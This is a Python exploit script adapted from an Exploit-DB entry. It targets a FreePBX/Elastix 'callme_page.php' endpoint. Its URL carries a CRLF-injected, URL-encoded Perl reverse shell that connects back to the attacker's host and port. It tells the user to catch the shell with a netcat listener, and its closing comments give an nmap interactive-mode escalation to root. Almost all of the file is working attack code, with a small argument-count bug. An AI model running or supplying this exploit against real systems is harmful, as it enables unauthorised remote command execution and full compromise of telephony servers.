#!/usr/bin/python

# Author: Robin van den Hurk
#
# Inspiration has been taken from https://www.exploit-db.com/exploits/18650
# Credits to the author

import sys
import requests

# Verify arguments
if (len(sys.argv) < 3):
	print("Usage: {} <rhost> <lhost> <lport>".format(sys.argv[0]))
	exit()

# Parse arguments
rhost=sys.argv[1]
lhost=sys.argv[2]
lport=sys.argv[3]
extension="1000"

# Print a tip
print("Make sure to listen for the callback from the remote host by executing 'nc -nlvp {}' in another shell".format(lport))

# Prepare url
url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

# Send request
result = requests.get(url, verify=False)

# Time to privesc
# You may be able to privesc using nmap:
#	> sudo nmap --interactive
#	nmap> !sh
#	> id
#	uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
